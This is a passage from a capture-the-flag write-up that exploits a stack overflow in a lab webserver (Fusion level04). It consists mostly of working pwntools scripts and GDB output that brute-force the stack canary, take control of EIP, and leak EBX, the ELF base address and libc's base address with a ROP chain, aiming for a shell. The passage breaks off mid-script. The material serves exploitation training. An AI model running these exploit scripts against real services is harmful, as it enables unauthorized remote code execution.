b [memory address after calling base64_decode() in validate_credentials()]
c
x/32xw $esp
echo -------------------------------------------------------------\n
x/32xw $esp+2048
c
quit
```

The exploit below fills the `details` buffer in the `validate_credentials` function, but does not overrun it.

```python
import base64
import string
import sys
import time
from pwn import *

# Pwn context
context.arch = 'i386'
context.log_level = 'debug'

# Environment
HOST = '192.168.254.156'
PORT = 20004
PASSWORD = '52H2h2c3uEP2LYRX'

conn = remote(HOST, PORT)

# The overflow occurs in the password
overflow = b"A" * (2048 - len(PASSWORD) - 1)
payload = b"".join([
  b"GET / HTTP/1.0\r\n",
  b"Host: " + HOST.encode('utf-8') + b":" + str(PORT).encode('UTF-8') + b"\r\n"
  b"User-Agent: curl/7.72.0\r\n"
  b"Accept: */*\r\n"
  b"Authorization: Basic " + base64.b64encode(b":" + PASSWORD.encode('UTF-8') + overflow),
  b"\r\n\r\n"
])

conn.send(payload)
conn.recvall()
conn.close()
```

Examining the contents in GDB:

```
fusion@fusion:~$ sudo gdb -q -p 1424 -x ~/.gdbinit
Breakpoint 1 at 0xb78de287
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0xb78de287
/home/fusion/.gdbinit:5: Error in sourced command file:
The program is not being run.
Attaching to process 1424
Reading symbols from /opt/fusion/bin/level04...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.13.so...done.
done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb78bb424 in __kernel_vsyscall ()
Breakpoint 2 at 0xb78de287: file level04/level04.c, line 205.
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0xb78de287 in validate_credentials at level04/level04.c:205
2       breakpoint     keep y   0xb78de287 in validate_credentials at level04/level04.c:205
[New process 23362]
[Switching to process 23362]

Breakpoint 1, 0xb78de287 in validate_credentials (line=0xbfb30581 "OjUySDJoMmMzdUVQMkxZUlhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"...) at level04/level04.c:205
205     level04/level04.c: No such file or directory.
        in level04/level04.c
0xbfb25fc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfb25fd0:     0xbfb25ff0      0x00000000      0x00000000      0x00000000
0xbfb25fe0:     0x00000000      0x00000000      0x00000000      0x00000010
0xbfb25ff0:     0x00000000      0x00000000      0x00000800      0x4832353a
0xbfb26000:     0x63326832      0x50457533      0x52594c32      0x41414158
0xbfb26010:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb26020:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb26030:     0x41414141      0x41414141      0x41414141      0x41414141
-------------------------------------------------------------
0xbfb267c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb267d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb267e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb267f0:     0x41414141      0x41414141      0x41414141      0x046d1f00
0xbfb26800:     0x0000000a      0x00000001      0xbfb3056c      0xb78e0118
0xbfb26810:     0xbfb3056c      0xb78ab884      0xb78df047      0xb78de4c0
0xbfb26820:     0xbfb30581      0xb78df047      0x00000015      0xbfb3538c
0xbfb26830:     0xbfb37a9c      0x00000000      0x00000000      0x00000000
[Inferior 2 (process 23362) exited normally]
```

In the memory dump above, the `details` structure starts at `0xbfb25ffc` and ends at `0xbfb267fc`. The range covers exactly 2048 bytes.
On Linux systems, stack canaries always end with `0x00` to make it more likely that the attacker's payload will get trucated during the buffer overflow in an attempt to replicate the stack canary. The null byte is an excellent choice to put in a stack canary because it is often a bad character that causes `str`-like operations such as `strcpy` to truncate the payload.

The stack canary is also located right after the `details` buffer. In the example above, it is located at `0xbfb267fc`.

If we overflow the least significant byte in the canary, the app should crash with a stack smashing error. Let's observe that in action:


```python
import base64
import string
import sys
import time
from pwn import *

# Pwn context
context.arch = 'i386'
context.log_level = 'debug'

# Environment
HOST = '192.168.254.156'
PORT = 20004
PASSWORD = '52H2h2c3uEP2LYRX'

conn = remote(HOST, PORT)

# The overflow occurs in the password
overflow = b"A" * (2048 - len(PASSWORD))
payload = b"".join([
  b"GET / HTTP/1.0\r\n",
  b"Host: " + HOST.encode('utf-8') + b":" + str(PORT).encode('UTF-8') + b"\r\n"
  b"User-Agent: curl/7.72.0\r\n"
  b"Accept: */*\r\n"
  b"Authorization: Basic " + base64.b64encode(b":" + PASSWORD.encode('UTF-8') + overflow),
  b"\r\n\r\n"
])

conn.send(payload)
conn.recvall()
conn.close()
```

Let's examine the output in GDB:

```
fusion@fusion:~$ sudo gdb -q -p 1424 -x ~/.gdbinit
Breakpoint 1 at 0xb78de287
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0xb78de287
/home/fusion/.gdbinit:5: Error in sourced command file:
The program is not being run.
Attaching to process 1424
Reading symbols from /opt/fusion/bin/level04...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.13.so...done.
done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb78bb424 in __kernel_vsyscall ()
Breakpoint 2 at 0xb78de287: file level04/level04.c, line 205.
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0xb78de287 in validate_credentials at level04/level04.c:205
2       breakpoint     keep y   0xb78de287 in validate_credentials at level04/level04.c:205
[New process 23753]
[Switching to process 23753]

Breakpoint 1, 0xb78de287 in validate_credentials (line=0xbfb30581 "OjUySDJoMmMzdUVQMkxZUlhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"...) at level04/level04.c:205
205     level04/level04.c: No such file or directory.
        in level04/level04.c
0xbfb25fc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfb25fd0:     0xbfb25ff0      0x00000000      0x00000000      0x00000000
0xbfb25fe0:     0x00000000      0x00000000      0x00000000      0x00000010
0xbfb25ff0:     0x00000000      0x00000000      0x00000801      0x4832353a
0xbfb26000:     0x63326832      0x50457533      0x52594c32      0x41414158
0xbfb26010:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb26020:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb26030:     0x41414141      0x41414141      0x41414141      0x41414141
-------------------------------------------------------------
0xbfb267c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb267d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb267e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfb267f0:     0x41414141      0x41414141      0x41414141      0x046d1f41
0xbfb26800:     0x0000000a      0x00000001      0xbfb3056c      0xb78e0118
0xbfb26810:     0xbfb3056c      0xb78ab884      0xb78df047      0xb78de4c0
0xbfb26820:     0xbfb30581      0xb78df047      0x00000015      0xbfb3538c
0xbfb26830:     0xbfb37a9c      0x00000000      0x00000000      0x00000000

Program received signal SIGABRT, Aborted.
0xb78bb424 in __kernel_vsyscall ()
A debugging session is active.

        Inferior 2 [process 23753] will be detached.
```

Notice how the NULL byte at `0xbfb267fc` suddenly became `\x41` and the process was aborted with `SIGABRT` indicating stack smashing protection kicking in.

With this knowledge, we can repeatedly overflow the canary one byte at a time to leak it.
In short, we will know that we have discovered the correct byte if stack smashing protection doesn't kick in.

The code below will leak the stack canary one byte at a time:

### leak-canary.py

```python
import argparse
import base64
import binascii
import collections
import time
import string
import sys
from pwn import *

# Pwn context
context.arch = 'i386'

def make_payload(args, overflow):
    payload = b"".join([
      b"GET / HTTP/1.0\r\n",
      b"Host: " + args.host.encode('utf-8') + b":" + str(args.port).encode('UTF-8') + b"\r\n"
      b"User-Agent: curl/7.72.0\r\n"
      b"Accept: */*\r\n"
      b"Authorization: Basic ",
      base64.b64encode(b":" + overflow),
      b"\r\n\r\n"
    ])
    return payload

def leak_canary(args, password):
    context.log_level = 'error'
    print('Leaking stack canary: ', end='\r')
    x86_addr_len = 4
    canary = b""
    while len(canary) < x86_addr_len:
        for b in range(0xff):
            conn = remote(args.host, args.port)

            # Overflow occurs in the password
            padding = b"A" * (2048 - len(password)- 1)
            overflow = b"".join([
                password,
                padding,
                canary,
                bytes([b])
            ])
            payload = make_payload(args, overflow)
            conn.send(payload)
            data = conn.recvall()
            conn.close()

            if b'stack smashing' not in data:
                canary += bytes([b])
                print(b, end='\r')
                break
            print('.', end='')

    print("\n")
    context.log_level = 'info'
    info(f'Stack canary: {hex(u32(canary))}')
    return canary

def exploit(args):
    password = b"52H2h2c3uEP2LYRX"
    canary = leak_canary(args, password)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fusion level04 exploit by r0kit.')
    parser.add_argument('--host', dest='host', type=str, required=True)
    parser.add_argument('--port', dest='port', type=int, default=20004)

    try:
        args = parser.parse_args()
        exploit(args)
        
    except argparse.ArgumentError as e:
        print("[!] {}".format(e))
        parser.print_usage()
        sys.exit(1)
```

Now, let's leak the stack canary:

```
kali@kali:~/ctf/fusion/level04$ python3 leak-canary.py --host 192.168.254.156
Leaking stack canary: 0...............................31.............................................................................................................109....4

[*] Stack canary: 0x46d1f00
```

Success! We have successfully brute forced the stack canary!

## Controlling EIP

Now that we have leaked the stack canary, let's crash the app to verify we can control the `EIP` register by appending a cyclic pattern to the vulnerable password field.

### calculate-eip-crash-offset.py

```python
import base64
import string
from pwn import *

# Pwn context
context.arch = 'i386'
context.log_level = 'debug'

# Environment
HOST = '192.168.254.156'
PORT = 20004
PASSWORD = '52H2h2c3uEP2LYRX'

canary = p32(0x46d1f00)
conn = remote(HOST, PORT)

# The overflow occurs in the password
padding = b"A" * (2048 - len(PASSWORD)- 1)
payload = b"".join([
  b"GET / HTTP/1.0\r\n",
  b"Host: " + HOST.encode('utf-8') + b":" + str(PORT).encode('UTF-8') + b"\r\n"
  b"User-Agent: curl/7.72.0\r\n"
  b"Accept: */*\r\n"
  b"Authorization: Basic " + base64.b64encode(b":" + PASSWORD.encode('UTF-8') + padding + canary + cyclic(0x100)),
  b"\r\n\r\n"
])

conn.send(payload)
conn.close()
```

After running the script above, let's examine where in our buffer we take control over `EIP`:

```
fusion@fusion:~$ sudo gdb -q -p 1424
Attaching to process 1424
Reading symbols from /opt/fusion/bin/level04...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.13.so...done.
done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb78bb424 in __kernel_vsyscall ()
(gdb) c
Continuing.
[New process 23989]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 23989]
0x61616168 in ?? ()
(gdb) quit
A debugging session is active.

        Inferior 2 [process 23989] will be detached.

Quit anyway? (y or n) y
Detaching from program: /opt/fusion/bin/level04, process 23989
```

If we lookup the `0x61616168`, it will let us know that we can control `EIP` 28 bytes after the stack canary:


```
kali@kali:~/ctf/fusion/level04$ cyclic -l 0x61616168
28
```

Now, let's verify control over `EIP` by setting to `0xdeadbeef`:

### calculate-eip-crash-deadbeef.py

```python
import base64
import string
from pwn import *

# Pwn context
context.arch = 'i386'
context.log_level = 'debug'

# Environment
HOST = '192.168.254.156'
PORT = 20004
PASSWORD = '52H2h2c3uEP2LYRX'

canary = p32(0x46d1f00)
conn = remote(HOST, PORT)

# The overflow occurs in the password
padding = b"A" * (2048 - len(PASSWORD)- 1)
payload = b"".join([
  b"GET / HTTP/1.0\r\n",
  b"Host: " + HOST.encode('utf-8') + b":" + str(PORT).encode('UTF-8') + b"\r\n"
  b"User-Agent: curl/7.72.0\r\n"
  b"Accept: */*\r\n"
  b"Authorization: Basic " + base64.b64encode(b":" + PASSWORD.encode('UTF-8') + padding + canary + b"A"*28 + p32(0xdeadbeef)),
  b"\r\n\r\n"
])

conn.send(payload)
conn.close()
```

In GDB:

```
fusion@fusion:~$ sudo gdb -q -p 1424
Attaching to process 1424
Reading symbols from /opt/fusion/bin/level04...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.13.so...done.
done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb78bb424 in __kernel_vsyscall ()
(gdb) c
Continuing.
[New process 24008]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 24008]
0xdeadbeef in ?? ()
```

Success! We are now able to reliably control the `EIP` register!

## Defeating PIE (Position Independent Executables)

Since the stack is non-executable, we ultimately want to search and combine ROP gadgets to pop a shell.
However, we can't simply invoke library and function calls from within the executable since the ELF's base address is randomized. This is effectively what `PIE` does.
Therefore, we must leak the function to an address in the ELF to discover the ELF's base address.

Since we take control over `EIP` 28 bytes after the stack canary, we can effectively leak this address the same way we did for the stack canary.

That said, this challenge presents a couple caveats against this approach.

In a normal scenario, from the `validate_credentials()`, the original program returned back to the `webserver()` function, representing a valid form of code execution.
Therefore, if we want to leak a valid return address, we need the program to behave the same way it would when a non-malicious user interacts with it.
In `x86`, the function epilogue normally shifts the stack upwards towards higher addresses and pops some values into registers which are then used by the function's caller.
Let's take a look at the function epilogue in `validate_credentials()`:

```
[0x000016dc]> s sym.validate_credentials
[0x00002150]> pdf
... CONTENT SNIPPED ...
│  │││╎││   0x000022af      81c44c080000   add esp, 0x84c
│  │││╎││   0x000022b5      5b             pop ebx
│  │││╎││   0x000022b6      5e             pop esi
│  │││╎││   0x000022b7      5f             pop edi
│  │││╎││   0x000022b8      5d             pop ebp
│  │││╎││   0x000022b9      c3             ret
... CONTENT SNIPPED ...
```

Notice how the stack is shifted upwards by `0x84c` bytes, then 4 addresses (i.e. 16 bytes) are popped off the stack and finally we have the return address.
Since buffer overflow attacks fill the buffer, if we were to overwrite the return address, then the previous values on the stack we overflowed would end up in `EBX`, `ESI`, `EDI`, and `EBP` respectively.

Therefore, we should take care to see whether overwriting the values in any of those registers has a significant impact on how the caller `webserver()` behaves.

If you want to see what happens when you overwrite the `EBX` register, you can play around a bit with the script below (make sure you provide the valid password and stack canary):

### leak-address-fail.py

```python
import argparse
import base64
import string
from pwn import *

# Pwn context
context.arch = 'i386'
context.log_level = 'warn'

def exploit(args):
    print('Trying to leak return address: ', end='\r')
    x86_addr_len = 4
    canary = p32(0x46d1f00)
    return_address = b""
    while len(return_address) < x86_addr_len:
        for b in range(0xff):
            conn = remote(args.host, args.port)

            # The overflow occurs in the password
            overflow = b"A" * (2048 - len(args.password)- 1)
            payload = b"".join([
              b"GET / HTTP/1.0\r\n",
              b"Host: " + args.host.encode('utf-8') + b":" + str(args.port).encode('UTF-8') + b"\r\n"
              b"User-Agent: curl/7.72.0\r\n"
              b"Accept: */*\r\n"
              b"Authorization: Basic " + base64.b64encode(b":" + args.password.encode('UTF-8') + overflow + canary + b"A" * 28 + return_address + bytes([b])),
              b"\r\n\r\n"
            ])

            conn.send(payload)
            data = conn.recvall()
            conn.close()

            if b'HTTP/1.0 200 Ok' in data:
                # import ipdb;ipdb.set_trace()
                return_address += bytes([b])
                print(b, end='\r')
                break
            print('.', end='')

    print("\n")
    context.log_level = 'info'
    info(f'Return address: {hex(u32(return_address))}')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fusion level04 failed attempt to leak return address.')
    parser.add_argument('--host', dest='host', type=str, required=True)
    parser.add_argument('--port', dest='port', type=int, default=20004)
    parser.add_argument('--password', dest='password', type=str, required=True)

    try:
        args = parser.parse_args()
        exploit(args)
    except argparse.ArgumentError as e:
        print("[!] {}".format(e))
        parser.print_usage()
        sys.exit(1)
```

With that out of the way, let's disassemble the caller function `webserver()` to see why the value of the `EBX` register matters.
The image below was from [cutter](https://github.com/radareorg/cutter), a front-end interface for radare2.

![](/assets/images/fusion-level04/ee-fusion-04-ebx-offset.png)

Effectively, `[ebx - 0x10bb]` is being compared to `[esp + 0xc45c]`.
Debugging this in GDB will do a string insensitive comparison of the values pointed to by the offsets above.
We need to take the red arrow in the diagram since we need the `jne` operation to result in false, otherwise we end up in the `send_error` function.
I recommend examining the `webserver()` function in a graphical disassembler if you wish to further look into this which is an excercise left to the reader.

Now that we know why we need to retain the original `EBX`, let's leak it:

### leak-ebx.py

```python
import argparse
import base64
import binascii
import collections
import time
import string
import sys
from pwn import *

# Pwn context
context.arch = 'i386'

# Environment
PASSWORD_LEN = 16                                                                       # The hard-coded length of the app's password

def make_payload(args, overflow):
    payload = b"".join([
      b"GET / HTTP/1.0\r\n",
      b"Host: " + args.host.encode('utf-8') + b":" + str(args.port).encode('UTF-8') + b"\r\n"
      b"User-Agent: curl/7.72.0\r\n"
      b"Accept: */*\r\n"
      b"Authorization: Basic ",
      base64.b64encode(b":" + overflow),
      b"\r\n\r\n"
    ])
    return payload

def leak_ebx(args, password, canary):
    context.log_level = 'warn'
    print('Leaking EBX: ', end='\r')
    x86_addr_len = 4
    padding = b"A" * (2048 - len(password)- 1)
    post_canary_padding = b""
    post_canary_eip_offset = 0x1c
    post_canary_ebx_offset = post_canary_eip_offset - 0x10
    post_canary_ebx_padding = b"A" * post_canary_ebx_offset
    ebx = b""
    while len(ebx) < x86_addr_len:
        for b in range(0xff):
            conn = remote(args.host, args.port)
            overflow = b"".join([
                password,
                padding,
                canary,
                post_canary_ebx_padding,
                ebx,
                bytes([b])
            ])
            payload = make_payload(args, overflow)
            conn.send(payload)
            data = conn.recvall()
            conn.close()

            if b"HTTP/1.0 200 Ok" in data:
                ebx += bytes([b])
                print(b, end='\r')
                break
            print('.', end='')

    print("\n")
    context.log_level = 'info'
    ebx = u32(ebx)
    info(f'EBX: {hex(ebx)}')
    return ebx

def exploit(args):
    password = b"52H2h2c3uEP2LYRX"
    canary = p32(u32(binascii.unhexlify("046d1f00"), endian='big'))
    ebx = leak_ebx(args, password, canary)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fusion level04 exploit by r0kit.')
    parser.add_argument('--host', dest='host', type=str, required=True)
    parser.add_argument('--port', dest='port', type=int, default=20004)
    parser.add_argument('--password-leak-delay-loops', dest='delay_loops', type=int, default=10)

    try:
        args = parser.parse_args()
        exploit(args)
        
    except argparse.ArgumentError as e:
        print("[!] {}".format(e))
        parser.print_usage()
        sys.exit(1)
```

```
$ python3 leak-ebx.py --host 192.168.254.156
Leaking EBX: ........................24.1..............................................................................................................................................142.......................................................................................................................................................................................183

[*] EBX: 0xb78e0118
```

And it looks like we leaked EBX! Let's verify that this is indeed a sane value by interacting the the webserver a regular user would.
I set a breakpoint just after `validate_credentials()` returns back to its caller `webserver()`:

```
(gdb) disas webserver
... CONTENT SNIPPED ...
0xb78de4bb <+459>:   call   0xb78de150 <validate_credentials>                              
0xb78de4c0 <+464>:   mov    DWORD PTR [esp+0x30],eax
... CONTENT SNIPPED ...
```

Use the following gdbscript, though you will want to modify the breakpoint to the memory address representing `<webserver+464>`:

```
fusion@fusion:~$ cat gdbinit-ebx
set disassembly-flavor intel
set follow-fork-mode child
b *0xb78de4c0
c
echo EBX: \n
x/xw $ebx
echo -------------------------------------------------------------\n
echo EBX - 0x10bb:\n
x/s $ebx-0x10bb
echo -------------------------------------------------------------\n
echo ESP + 0xc45c\n
x/s $esp+0xc45c
c
quit
```

```
kali@kali:~/ctf/fusion/level04$ curl -vv -H "Authorization: Basic `echo -n :52H2h2c3uEP2LYRX | base64`" http://192.168.254.156:20004
*   Trying 192.168.254.156:20004...
* Connected to 192.168.254.156 (192.168.254.156) port 20004 (#0)
> GET / HTTP/1.1
> Host: 192.168.254.156:20004
> User-Agent: curl/7.72.0
> Accept: */*
> Authorization: Basic OjUySDJoMmMzdUVQMkxZUlg=
>
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 Ok
< Server: level04.c
< Date: Mon, 26 Oct 2020 15:00:01 GMT
< Content-Type: text/html
< Last-Modified: Fri, 27 Apr 2012 08:00:12 GMT
< Connection: close
<
<html><head><title>Index of ./</title></head>
<body bgcolor="#99cc99"><h4>Index of ./</h4>
<pre>
<a href=".">.                               </a>    27Apr2012 18:00            220
<a href="..">..                              </a>    15Dec2011 10:37             60
<a href="core">core                            </a>    07Apr2012 12:40         339968
<a href="level00.pid">level00.pid                     </a>    26Oct2020 04:22              5
<a href="level01.pid">level01.pid                     </a>    06Nov2012 13:43              5
<a href="level02.pid">level02.pid                     </a>    26Oct2020 04:22              5
<a href="level03.pid">level03.pid                     </a>    26Oct2020 04:22              5
<a href="level04.pid">level04.pid                     </a>    26Oct2020 04:22              5
<a href="level05.pid">level05.pid                     </a>    26Oct2020 04:22              5
<a href="level06.pid">level06.pid                     </a>    26Oct2020 04:22              5
<a href="level07.pid">level07.pid                     </a>    26Oct2020 04:22              5
<a href="level09.pid">level09.pid                     </a>    26Oct2020 01:21              5
<a href="level10.pid">level10.pid                     </a>    08Apr2012 22:26              5
<a href="level11.pid">level11.pid                     </a>    09Apr2012 10:25              5
<a href="level12.pid">level12.pid                     </a>    26Oct2020 01:21              5
<a href="level13.pid">level13.pid                     </a>    21Apr2012 19:01              6
<a href="level14.pid">level14.pid                     </a>    28Apr2012 20:48              6
</pre>
<hr>
<address><a href="https://gist.github.com/2449d15e6fb675383c8b">level04.c</a></address>
</body></html>
* Closing connection 0
```

```
fusion@fusion:~$ sudo gdb -q -p 1424 -x ~/gdbinit-ebx
... CONTENT SNIPPED ...
Breakpoint 1 at 0xb78de4c0: file level04/level04.c, line 237.
[New process 15529]
[Switching to process 15529]

Breakpoint 1, 0xb78de4c0 in webserver (argc=0, argv=0x4) at level04/level04.c:237
237     level04/level04.c: No such file or directory.
        in level04/level04.c
EBX:
0xb78e0118:     0x0000401c
-------------------------------------------------------------
EBX - 0x10bb:
0xb78df05d:      "get"
-------------------------------------------------------------
ESP + 0xc45c
0xbfb32c7c:      "GET"
[Inferior 2 (process 15529) exited normally]
```

The above makes sense since we are comparing `get` to `GET` which results in the conditional jump that doesn't result in a `send_error()`.

Now that we have leaked `EBX`, we should be able to leak the return address having the process return an `HTTP 200 Ok`, indicating normal behavior:

### calculate-elf-base-address.py

```python
import argparse
import base64
import binascii
import collections
import time
import string
import sys
from pwn import *

# Pwn context
context.arch = 'i386'

# Environment
PASSWORD_LEN = 16                                                                       # The hard-coded length of the app's password
TARGET_ELF = ELF('./level04')                                                           # Executable to search for PLT offsets

def make_payload(args, overflow):
    payload = b"".join([
      b"GET / HTTP/1.0\r\n",
      b"Host: " + args.host.encode('utf-8') + b":" + str(args.port).encode('UTF-8') + b"\r\n"
      b"User-Agent: curl/7.72.0\r\n"
      b"Accept: */*\r\n"
      b"Authorization: Basic ",
      base64.b64encode(b":" + overflow),
      b"\r\n\r\n"
    ])
    return payload

def leak_elf_base_address(args, password, canary, ebx):
    context.log_level = 'error'
    print('Leaking return address: ', end='\r')
    x86_addr_len = 4
    padding = b"A" * (2048 - len(password)- 1)
    post_canary_padding = b""
    post_canary_eip_offset = 0x1c
    post_canary_ebx_offset = post_canary_eip_offset - 0x10
    post_canary_ebx_padding = b"A" * post_canary_ebx_offset
    post_ebx_return_address_offset = post_canary_ebx_offset + 0x0c
    post_ebx_return_address_padding = b"A" * 0x0c
    return_address = b""
    while len(return_address) < x86_addr_len:
        for b in range(0xff):
            conn = remote(args.host, args.port)
            overflow = b"".join([
                password,
                padding,
                canary,
                post_canary_ebx_padding,
                p32(ebx),
                post_ebx_return_address_padding,
                return_address,
                bytes([b])
            ])
            payload = make_payload(args, overflow)
            conn.send(payload)
            data = conn.recvall()
            conn.close()

            if b"HTTP/1.0 200 Ok" in data:
                return_address += bytes([b])
                print(b, end='\r')
                break
            print('.', end='')

    print("\n")
    context.log_level = 'info'
    return_address = u32(return_address)
    info(f'Return Address: {hex(return_address)}')

    # We know that the webserver() function is the caller of the overflowed function.
    # Therefore, from GDB, it returns 325 bytes into the function

    webserver = TARGET_ELF.sym['webserver']
    webserver_offset = 325 # Discovered with GDB analysis
    base_address = return_address - webserver - webserver_offset
    info(f'Calculated Base Address: {hex(base_address)}')
    return base_address

def exploit(args):
    password = b"52H2h2c3uEP2LYRX"
    canary = p32(u32(binascii.unhexlify("046d1f00"), endian='big'))
    ebx = u32(binascii.unhexlify("b78e0118"), endian='big')
    leak_elf_base_address(args, password, canary, ebx)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fusion level04 exploit by r0kit.')
    parser.add_argument('--host', dest='host', type=str, required=True)
    parser.add_argument('--port', dest='port', type=int, default=20004)
    parser.add_argument('--password-leak-delay-loops', dest='delay_loops', type=int, default=10)

    try:
        args = parser.parse_args()
        exploit(args)
        
    except argparse.ArgumentError as e:
        print("[!] {}".format(e))
        parser.print_usage()
        sys.exit(1)
```

```
kali@kali:~/ctf/fusion/level04$ python3 calculate-elf-base-address.py --host 192.168.254.156
[*] '/home/kali/ctf/fusion/level04/level04'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
Leaking return address: .....................................................53....................................................................................................................................................................................................................................228.............................................................................................................................................141.......................................................................................................................................................................................183

[*] Return Address: 0xb78de435
[*] Calculated Base Address: 0xb78dc000
```

Ok, let me explain how the base address was calculated here.
Notice how the return address leaked was `0xb78de435` which, when examining it in GDB represents some offset into the `webserver()` function.
Although this return address is *different* from the original one `0xb78de4c0`, it still got the code's execution to return an `HTTP 200 Ok` which is good enough for us.

Let's see how this memory address looks like in GDB:

```
(gdb) x/xw 0xb78de435
0xb78de435 <webserver+325>:     0x010f840f
(gdb)
```

From that absolute address, we can calculate the relative offset at which `webserver()` is positioned in the ELF by seeking it in `radare2`:

```
[0x000023ec]> s sym.webserver
[0x000022f0]>
```

Keep in mind that `0xb78de435` represents the following: `ELF base address + webserver offset - 325`. With this information, we can finally calculate the ELF's base address.

Now that we have calculated the ELF's base address, we can now start crafting our ROP chain!

## Leaking Libc's Base Address

Since the service runs on the remote network, we need a way to invoke `system()` with `/bin/sh` as an argument.
This should be sufficient since the program uses stdout and stdin as its socket's input and output streams.
This was how we were able to previously leak the ELF's base address earlier.

Since neither `system()` or `execve()` are imported by the ELF, we need to discover a couple things:

1. The base address at which libc is loaded.
2. Determine the libc version.

For this example, we already know that libc's version is `libc-2.13`.

However, when this information is not disclosed in such a CTF-style, we first need to disclove a GOT entry for a valid function in `libc`.
Once we have that information, we can look it up in the [libc database](https://github.com/niklasb/libc-database) to determine the exact libc version.
After determining the libc version, we can calculate the base address at which libc was loaded at, effectively bypassing ASLR.

The code below will leak libc's base address:

### leak-libc-base-address.py

```python
import argparse
import base64
import binascii
import collections
import time
import string
import sys
from pwn import *

# Pwn context
context.arch = 'i386'

# Environment
PASSWORD_LEN = 16                                                                       # The hard-coded length of the app's password
TARGET_ELF = ELF('./level04')                                                           # Executable to search for PLT offsets
TARGET_LIBC = ELF('/home/kali/tools/libc-database/db/libc6_2.13-20ubuntu5_i386.so')     # LIBC matching that on the remote system

def make_payload(args, overflow):
    payload = b"".join([
      b"GET / HTTP/1.0\r\n",
      b"Host: " + args.host.encode('utf-8') + b":" + str(args.port).encode('UTF-8') + b"\r\n"
      b"User-Agent: curl/7.72.0\r\n"
      b"Accept: */*\r\n"
      b"Authorization: Basic ",
      base64.b64encode(b":" + overflow),
      b"\r\n\r\n"
    ])
    return payload

def leak_libc_base_address(args, password, canary, ebx, elf_base_address):
    context.log_level = 'debug'

    rop = ROP(TARGET_ELF)

    # A small ROP chain to leak __libc_start_main from the GOT
    # __printf_chk(0, __libc_start_main);
    # exit();
    rop.raw(p32(elf_base_address + TARGET_ELF.sym['__printf_chk']))
    rop.raw(p32(elf_base_address + TARGET_ELF.plt['exit']))
    rop.raw(p32(0))
    rop.raw(p32(elf_base_address + TARGET_ELF.got['__libc_start_main']))
    return_address = rop.chain()

    conn = remote(args.host, args.port)
    padding = b"A" * (2048 - len(password)- 1)
    post_canary_padding = b""
    post_canary_eip_offset = 0x1c
    post_canary_ebx_offset = post_canary_eip_offset - 0x10
    post_canary_ebx_padding = b"A" * post_canary_ebx_offset
    post_ebx_return_address_offset = post_canary_ebx_offset + 0x0c
    post_ebx_return_address_padding = b"A" * 0x0c

    overflow = b"".join([
        password,
        padding,
        canary,
        post_canary_ebx_padding,
        p32(ebx),
        post_ebx_return_address_padding,
        return_address
    ])

    payload = make_payload(args, overflow)
    conn.send(payload)
    data = conn.recvall()
    leaked_libc_start_main = u32(data[:4])
    conn.close()

    info(f'Leaked __libc_start_main at {hex(leaked_libc_start_main)}')

    libc_start_main = TARGET_LIBC.sym['__libc_start_main']
    libc_base_address = leaked_libc_start_main - libc_start_main
    info(f'Libc base address: {hex(libc_base_address)}')
    return libc_base_address

def exploit(args):
    password = b"52H2h2c3uEP2LYRX"
    canary = p32(u32(binascii.unhexlify("046d1f00"), endian='big'))
    ebx = u32(binascii.unhexlify("b78e0118"), endian='big')
    elf_base_address = u32(binascii.unhexlify("b78dc000"), endian='big')
